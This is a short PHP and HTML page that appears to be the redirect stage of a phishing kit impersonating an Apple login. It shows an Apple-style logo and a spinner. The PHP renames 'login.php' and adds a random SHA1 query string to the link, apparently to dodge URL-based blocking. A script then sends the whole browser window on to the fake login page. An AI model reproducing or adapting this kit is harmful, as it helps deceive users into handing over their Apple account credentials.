<?php 
//----------- RPT
error_reporting(E_ALL);
//----------- MLF
$ism_milafat = array('login.php');
//----------- RNM
$ism_jadid = $ism_milafat[array_rand($ism_milafat)];
foreach ($ism_milafat as $ism_milaf)  {
	     if (file_exists($ism_milaf)) {
		rename($ism_milaf, $ism_jadid);
		$url_jadid = sha1($ism_jadid.microtime());
	}
}

//----------- RDT
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>login apple</title>
	<center>
<img src='330522logo411.png' style='margin-left:20px;margin-top:120px;margin-bottom:20px'/>
<h3><img src='spinner.gif'/></h3>
</center>



</head>
<body>
<script type="text/javascript">
	top.location = "<?php echo $ism_jadid.'?'.$url_jadid; ?>"
</script>
	
</body>
</html>
